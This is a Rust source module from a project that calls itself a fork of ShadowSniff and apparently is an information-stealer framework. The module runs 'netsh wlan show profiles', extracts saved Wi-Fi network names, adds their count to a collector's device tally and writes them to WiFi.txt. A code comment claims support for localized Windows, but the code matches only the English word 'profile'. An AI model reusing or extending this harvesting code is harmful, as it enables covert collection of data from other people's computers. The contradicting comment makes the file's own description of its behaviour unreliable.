/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use alloc::string::{String, ToString};
use alloc::vec::Vec;
use collector::{Collector, Device};
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use tasks::{Task, parent_name};
use utils::process::run_process;

/// Enumerates saved Wi-Fi profiles via `netsh wlan show profiles`.
///
/// Works on both English and localized Windows: any profile line has the
/// shape `... : <name>` inside the profiles section, so we collect every
/// non-empty right-hand side and drop section headers by heuristic.
pub struct WifiTask;

impl<C: Collector, F: FileSystem> Task<C, F> for WifiTask {
    parent_name!("WiFi.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Ok(output) = run_process("netsh.exe wlan show profiles") else {
            return;
        };

        let text = String::from_utf8_lossy(&output);
        let mut profiles: Vec<String> = Vec::new();

        for line in text.lines() {
            let Some(colon) = line.find(':') else {
                continue;
            };

            let (key, value) = (line[..colon].trim(), line[colon + 1..].trim());
            if value.is_empty() {
                continue;
            }

            // Section headers ("Profiles on interface Wi-Fi:", localized
            // variants) end with ':' as the whole value; profile lines carry
            // the word "Profile" (or a localized equivalent we accept loosely
            // by requiring the key to be longer than just the header words).
            if key.is_empty() || key.ends_with(':') {
                continue;
            }

            if key.to_ascii_lowercase().contains("profile")
                && !profiles.iter().any(|p| p == value)
            {
                profiles.push(value.to_string());
            }
        }

        if profiles.is_empty() {
            return;
        }

        collector
            .get_device()
            .increase_wifi_networks_by(profiles.len());

        let joined = profiles.join("\n");
        let _ = joined.write_to(filesystem, parent);
    }
}
